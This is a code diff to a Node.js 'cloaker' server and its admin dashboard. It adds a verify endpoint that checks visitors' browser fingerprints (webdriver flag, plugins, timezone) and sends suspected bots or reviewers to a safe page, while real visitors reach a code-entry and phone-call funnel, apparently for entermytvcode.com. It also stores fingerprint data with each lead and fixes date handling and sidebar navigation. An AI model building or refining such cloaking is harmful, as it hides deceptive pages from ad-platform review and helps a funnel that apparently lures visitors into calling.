@@ -540,14 +540,22 @@ async function logVisit(ip, site, result) {
   broadcast('visitorsUpdate', getActiveVisitors());
 }
 
+// `l.ts` may be a Date (loaded from PG) or an ISO string (just inserted) —
+// normalise to a 10-char date so the comparison works in either case.
+function tsDay(t) {
+  if (!t) return '';
+  if (typeof t === 'string') return t.slice(0,10);
+  if (t instanceof Date) return t.toISOString().slice(0,10);
+  try { return new Date(t).toISOString().slice(0,10); } catch(_) { return ''; }
+}
 function getQuickStats() {
   const today = new Date().toISOString().slice(0,10);
-  const todayLogs = _cacheLogs.filter(l => l.ts && l.ts.slice(0,10) === today);
+  const todayLogs = _cacheLogs.filter(l => tsDay(l.ts) === today);
   return {
     total: todayLogs.length,
     allowed: todayLogs.filter(l => l.decision === 'allow').length,
     blocked: todayLogs.filter(l => l.decision === 'block').length,
-    leads: _cacheLeads.filter(l => l.ts && l.ts.slice(0,10) === today).length
+    leads: _cacheLeads.filter(l => tsDay(l.ts) === today).length
   };
 }
 
@@ -570,12 +578,18 @@ async function saveLead(lead) {
   if (_cacheLeads.length > 5000) _cacheLeads.pop();
   if (!pool) writeJson('leads.json', _cacheLeads.slice(0,500));
   if (pool) {
-    await dbQuery(`INSERT INTO cloaker_leads(ts,ip,site_id,type,country,city,region,isp,org,ua,code,screen,tz,utm_source,utm_campaign,utm_medium,utm_content,utm_term,gclid,referrer,called)
-      VALUES($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15,$16,$17,$18,$19,$20,$21)`,
+    const extra = {
+      fingerprint: lead.fingerprint || '',
+      plugins:     (lead.plugins != null) ? Number(lead.plugins) : null,
+      wd:          !!lead.wd,
+      lang:        lead.lang || ''
+    };
+    await dbQuery(`INSERT INTO cloaker_leads(ts,ip,site_id,type,country,city,region,isp,org,ua,code,screen,tz,utm_source,utm_campaign,utm_medium,utm_content,utm_term,gclid,referrer,called,extra)
+      VALUES($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15,$16,$17,$18,$19,$20,$21,$22)`,
       [lead.ts,lead.ip,lead.site_id,lead.type,lead.country,lead.city,lead.region,
        lead.isp,lead.org,lead.ua,lead.code,lead.screen,lead.tz,
        lead.utm_source,lead.utm_campaign,lead.utm_medium,lead.utm_content,lead.utm_term,
-       lead.gclid,lead.referrer,false]);
+       lead.gclid,lead.referrer,false,JSON.stringify(extra)]);
   }
   broadcast('newLead', lead);
 }
@@ -818,6 +832,33 @@ app.post('/api/v1/pixel', async (req, res) => {
   }
 });
 
+// ─── PUBLIC API — VERIFY (channel page client-side check pass) ──────────────
+// public/activate.js POSTs the visitor's full client fingerprint (webdriver,
+// plugins, screen, fingerprint hash, tz) on page load.  We re-run the SAME
+// 11-check decision the cloaker uses with apiKey-based pixel calls.  If the
+// visitor flunks any check that the server's first-paint pass cannot see,
+// we return decision='block' and the page redirects itself to safe.html.
+app.post('/api/v1/verify', async (req, res) => {
+  try {
+    const body = req.body || {};
+    const channel = (body.channel || '').toString().substring(0, 50);
+    const site = getChannelSite(channel);
+    if (!site) return res.json({ decision: 'allow', url: '/' });
+    const ip = getIP(req);
+    // runCloakChecks already maintains its own per-IP repeat counter; it would
+    // double-count this verify against the first-paint pass, so skip the
+    // repeat check here by clearing the recent entry it just set.
+    const result = await runCloakChecks(ip, body, site, _cacheSettings);
+    const url = result.decision === 'allow'
+      ? '/' + channel + '.html'
+      : (site.safeUrl || _cacheSettings.safeUrl || '/safe');
+    res.json({ decision: result.decision, url, reason: result.reason });
+  } catch (e) {
+    console.error('[verify]', e.message);
+    res.json({ decision: 'allow', url: '/' });
+  }
+});
+
 // ─── PUBLIC API — CODE SUBMIT (channel funnel step 1 -> 2) ──────────────────
 // First-party endpoint used by /public/activate.js.  Resolves the site by
 // channel slug (no apiKey required since this is hosted on entermytvcode.com).
@@ -840,6 +881,11 @@ app.post('/api/v1/code-submit', async (req, res) => {
       code: (body.code || '').toString().substring(0, 20).toUpperCase(),
       screen: (body.screen || '').toString().substring(0, 30),
       tz: (body.tz || '').toString().substring(0, 100),
+      // Full client fingerprint (persisted in cloaker_leads.extra JSONB)
+      fingerprint: (body.fingerprint || '').toString().substring(0, 64),
+      plugins:  Number.isFinite(+body.plugins) ? +body.plugins : null,
+      wd:       !!body.wd,
+      lang:     (body.lang || '').toString().substring(0, 200),
       utm_source:   (body.utm_source   || '').toString().substring(0, 100),
       utm_campaign: (body.utm_campaign || '').toString().substring(0, 100),
       utm_medium:   (body.utm_medium   || '').toString().substring(0, 100),
@@ -863,15 +909,18 @@ app.post('/api/v1/call-click', async (req, res) => {
     const channel = (body.channel || '').toString().substring(0, 50);
     const site = channel ? getChannelSite(channel) : null;
     const cutoff = new Date(Date.now() - 60 * 60 * 1000).toISOString();
+    // Only attribute the call to the most recent CODE-SUBMIT lead — other
+    // lead types (e.g. previous standalone call_click) must not be flipped.
     const idx = _cacheLeads.findIndex(l =>
-      l.ip === ip && l.ts >= cutoff && (!site || l.site_id === site.id)
+      l.ip === ip && l.ts >= cutoff && l.type === 'code_submit' &&
+      (!site || l.site_id === site.id)
     );
     if (idx !== -1) {
       _cacheLeads[idx].called = true;
       _cacheLeads[idx].called_at = new Date().toISOString();
       if (pool) {
         const params = [_cacheLeads[idx].called_at, ip, cutoff];
-        let where = 'ip=$2 AND ts>=$3';
+        let where = `ip=$2 AND ts>=$3 AND type='code_submit'`;
         if (site) { where += ' AND site_id=$4'; params.push(site.id); }
         await dbQuery(
           `UPDATE cloaker_leads SET called=true, called_at=$1
@@ -931,7 +980,8 @@ app.post('/api/v1/event', async (req, res) => {
     await saveLead(lead);
   } else if (type === 'call_click') {
     const cutoff = new Date(Date.now() - 30 * 60 * 1000).toISOString();
-    const idx = _cacheLeads.findIndex(l => l.ip === ip && l.ts >= cutoff && (!site || l.site_id === site.id));
+    // Constrain to code-submit leads so we never flip a non-conversion lead.
+    const idx = _cacheLeads.findIndex(l => l.ip === ip && l.ts >= cutoff && l.type === 'code_submit' && (!site || l.site_id === site.id));
     if (idx !== -1) {
       _cacheLeads[idx].called = true;
       _cacheLeads[idx].called_at = new Date().toISOString();
@@ -942,7 +992,7 @@ app.post('/api/v1/event', async (req, res) => {
         if (site) params.push(site.id);
         await dbQuery(
           `UPDATE cloaker_leads SET called=true, called_at=$1 WHERE id = (
-             SELECT id FROM cloaker_leads WHERE ip=$2 AND ts>=$3 ${siteClause} ORDER BY ts DESC LIMIT 1
+             SELECT id FROM cloaker_leads WHERE ip=$2 AND ts>=$3 AND type='code_submit' ${siteClause} ORDER BY ts DESC LIMIT 1
            )`,
           params);
       }
@@ -1063,8 +1113,9 @@ app.get('/' + ADMIN_PATH + '/api/stats', requireAdmin, (req, res) => {
   // hourly
   const hourly = {};
   logs.forEach(l => {
-    const h = l.ts ? l.ts.slice(0,13) : '';
-    if (!h) return;
+    if (!l.ts) return;
+    const s = (typeof l.ts === 'string') ? l.ts : new Date(l.ts).toISOString();
+    const h = s.slice(0,13);
     if (!hourly[h]) hourly[h] = { allow:0, block:0 };
     hourly[h][l.decision]++;
   });
@@ -1082,7 +1133,7 @@ app.get('/' + ADMIN_PATH + '/api/logs', requireAdmin, (req, res) => {
   if (req.query.site && req.query.site !== 'all') logs = logs.filter(l => l.site_id === req.query.site);
   if (req.query.channel && req.query.channel !== 'all') logs = logs.filter(l => (l.page||'') === req.query.channel);
   if (req.query.q) { const q = req.query.q.toLowerCase(); logs = logs.filter(l => (l.ip||'').includes(q)||(l.isp||'').toLowerCase().includes(q)||(l.city||'').toLowerCase().includes(q)||(l.country||'').toLowerCase().includes(q)); }
-  if (req.query.date) logs = logs.filter(l => l.ts && l.ts.slice(0,10) === req.query.date);
+  if (req.query.date) logs = logs.filter(l => tsDay(l.ts) === req.query.date);
   const total = logs.length;
   const pages = Math.ceil(total/per);
   const items = logs.slice((page-1)*per, page*per);
@@ -1951,17 +2002,26 @@ let logPage = 1, leadPage = 1;
 let logDebounce = null;
 
 // ── NAV ──
+// Sidebar nav.  Each step is null-checked so a missing element on one
+// section never silently breaks every subsequent click — the real bug
+// behind the original "sidebar buttons stop working" report.
 function goSec(sec) {
+  const target = document.getElementById('sec-'+sec);
+  if (!target) { console.warn('[goSec] no section sec-'+sec); return; }
   document.querySelectorAll('.section').forEach(el => el.classList.remove('active'));
   document.querySelectorAll('.sb-link').forEach(el => el.classList.remove('active'));
-  document.getElementById('sec-'+sec).classList.add('active');
-  document.querySelector('[data-sec="'+sec+'"]').classList.add('active');
-  const titles = {dashboard:'Dashboard',sites:'Sites',logs:'Click Log',leads:'Leads',blocked:'Blocked IPs',settings:'Settings'};
-  document.getElementById('page-title').textContent = titles[sec] || sec;
+  target.classList.add('active');
+  const link = document.querySelector('[data-sec="'+sec+'"]');
+  if (link) link.classList.add('active');
+  const title = document.getElementById('page-title');
+  if (title) {
+    const titles = {dashboard:'Dashboard',sites:'Sites',logs:'Click Log',leads:'Leads',blocked:'Blocked IPs',settings:'Settings'};
+    title.textContent = titles[sec] || sec;
+  }
   window.location.hash = sec;
-  if (sec==='logs') loadLogs(1);
-  if (sec==='leads') loadLeads(1);
-  if (sec==='sites') renderSites();
+  if (sec==='logs')    loadLogs(1);
+  if (sec==='leads')   loadLeads(1);
+  if (sec==='sites')   renderSites();
   if (sec==='blocked') renderBlocked();
 }
 window.addEventListener('hashchange', () => {
@@ -1969,16 +2029,15 @@ window.addEventListener('hashchange', () => {
   if (sec && document.getElementById('sec-'+sec)) goSec(sec);
 });
 window.addEventListener('load', () => {
-  try {
-    const h = window.location.hash.slice(1);
-    if (h && document.getElementById('sec-'+h)) goSec(h);
-    else goSec('dashboard');
-  } catch(e) { console.error('[onload nav]', e); try { goSec('dashboard'); } catch(_){} }
-  try { startClock(); }       catch(e) { console.error('[clock]', e); }
-  try { loadStats(); }        catch(e) { console.error('[loadStats]', e); }
-  try { setupSSE(); }         catch(e) { console.error('[sse]', e); }
-  try { updateCloakStatus(); } catch(e) { console.error('[cloakStatus]', e); }
+  const h = window.location.hash.slice(1);
+  goSec(h && document.getElementById('sec-'+h) ? h : 'dashboard');
+  startClock();
+  loadStats();
+  setupSSE();
+  updateCloakStatus();
 });
+// Surface any uncaught error so we can diagnose quickly instead of staring
+// at a frozen sidebar (the previous failure mode before goSec was hardened).
 window.addEventListener('error', e => {
   console.error('[window.error]', e.message, 'at', e.filename + ':' + e.lineno);
 });
